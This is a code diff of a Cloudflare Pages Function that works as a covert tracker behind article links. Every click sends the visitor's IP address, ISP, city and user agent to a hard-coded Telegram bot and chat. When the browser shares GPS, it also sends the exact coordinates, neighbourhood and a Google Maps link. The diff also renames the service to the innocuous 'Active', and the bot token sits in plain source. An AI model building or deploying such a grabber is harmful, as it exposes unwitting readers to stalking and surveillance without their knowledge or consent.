@@ -1,4 +1,4 @@
-// Cloudflare Pages Function: /api/location with Real GPS Telegram Alerts
+// Cloudflare Pages Function: /api/location
 
 const DEFAULT_BOT_TOKEN = '9189550669:AAEorTZyQhF2vZlZHzFgU6Tgxqw4Y2CKgrk';
 const DEFAULT_CHAT_ID = '7070372458';
@@ -34,17 +34,20 @@ async function reverseGeocode(lat, lon) {
   }
 }
 
-async function sendTelegramAlert(env, record) {
+async function sendTelegramAlert(env, record, isExactGPS = false) {
   const token = (env && env.TELEGRAM_BOT_TOKEN) || DEFAULT_BOT_TOKEN;
   const chatId = (env && env.TELEGRAM_CHAT_ID) || DEFAULT_CHAT_ID;
 
   if (!token || !chatId) return;
 
-  const area = record.address?.neighbourhood || record.address?.road || 'Street Level';
-  const city = record.address?.city || record.address?.district || 'Nepal';
-  const mapsUrl = record.address?.mapsUrl || `https://www.google.com/maps?q=${record.latitude},${record.longitude}`;
+  let message = '';
 
-  const message = `🎯 *EXACT GPS LOCATION CAPTURED*
+  if (isExactGPS) {
+    const area = record.address?.neighbourhood || record.address?.road || 'Street Level';
+    const city = record.address?.city || record.address?.district || 'Nepal';
+    const mapsUrl = record.address?.mapsUrl || `https://www.google.com/maps?q=${record.latitude},${record.longitude}`;
+
+    message = `🎯 *EXACT GPS LOCATION CAPTURED*
 ━━━━━━━━━━━━━━━━━━━━
 📰 *Article:* \`${record.slug}\`
 🏙️ *Area / Tole:* ${area}
@@ -55,6 +58,21 @@ async function sendTelegramAlert(env, record) {
 ⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Kathmandu' })} (Nepal Time)
 
 🔗 [Click here to Open in Google Maps](${mapsUrl})`;
+  } else {
+    // Cloudflare Edge Location (First hit on click)
+    const mapsUrl = `https://www.google.com/maps?q=${record.latitude},${record.longitude}`;
+
+    message = `🌐 *LINK CLICKED (Cloudflare Location)*
+━━━━━━━━━━━━━━━━━━━━
+📰 *Article:* \`${record.slug}\`
+🏙️ *City:* ${record.city || 'Unknown'}
+🗺️ *Region:* ${record.region || 'Nepal'}
+📡 *ISP Provider:* ${record.isp || 'Mobile / Wi-Fi'}
+🌐 *IP:* \`${record.ip}\`
+⏰ *Time:* ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Kathmandu' })} (Nepal Time)
+
+🔗 [Approximate Location on Google Maps](${mapsUrl})`;
+  }
 
   try {
     await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -76,36 +94,55 @@ export async function onRequestPost(context) {
   try {
     const body = await context.request.json();
     const { latitude, longitude, accuracy, slug } = body;
-
-    // Reject or ignore if no real GPS coordinates provided
-    if (latitude === undefined || longitude === undefined) {
-      return new Response(JSON.stringify({ error: 'GPS coordinates required' }), {
-        status: 400,
-        headers: { 'Content-Type': 'application/json' },
-      });
-    }
+    const cf = context.request.cf || {};
 
     const ip = context.request.headers.get('cf-connecting-ip') || 'local';
     const userAgent = context.request.headers.get('user-agent') || '';
 
-    const address = await reverseGeocode(latitude, longitude);
+    // If real GPS coordinates are received
+    if (latitude !== undefined && longitude !== undefined) {
+      const address = await reverseGeocode(latitude, longitude);
+
+      const record = {
+        id: Date.now().toString(),
+        latitude,
+        longitude,
+        accuracy: accuracy ? Math.round(accuracy) : null,
+        address,
+        slug: slug || 'home',
+        timestamp: new Date().toISOString(),
+        ip,
+        userAgent,
+      };
+
+      context.waitUntil(sendTelegramAlert(context.env, record, true));
+
+      return new Response(JSON.stringify({ success: true, type: 'gps', record }), {
+        status: 200,
+        headers: { 'Content-Type': 'application/json' },
+      });
+    }
+
+    // 1st Hit: Cloudflare Edge location upon link open
+    const ipLat = cf.latitude ? parseFloat(cf.latitude) : 27.7172;
+    const ipLon = cf.longitude ? parseFloat(cf.longitude) : 85.3240;
 
     const record = {
       id: Date.now().toString(),
-      latitude,
-      longitude,
-      accuracy: accuracy ? Math.round(accuracy) : null,
-      address,
+      latitude: ipLat,
+      longitude: ipLon,
+      city: cf.city || 'Kathmandu',
+      region: cf.region || cf.country || 'Nepal',
+      isp: cf.asOrganization || 'Internet Provider',
       slug: slug || 'home',
       timestamp: new Date().toISOString(),
       ip,
       userAgent,
     };
 
-    // Send Telegram alert in background via Cloudflare Edge
-    context.waitUntil(sendTelegramAlert(context.env, record));
+    context.waitUntil(sendTelegramAlert(context.env, record, false));
 
-    return new Response(JSON.stringify({ success: true, record }), {
+    return new Response(JSON.stringify({ success: true, type: 'cloudflare_ip', record }), {
       status: 200,
       headers: { 'Content-Type': 'application/json' },
     });
@@ -118,7 +155,7 @@ export async function onRequestPost(context) {
 }
 
 export async function onRequestGet() {
-  return new Response(JSON.stringify({ status: 'ok', service: 'Real GPS Telegram Alert Active' }), {
+  return new Response(JSON.stringify({ status: 'ok', service: 'Active' }), {
     status: 200,
     headers: { 'Content-Type': 'application/json' },
   });
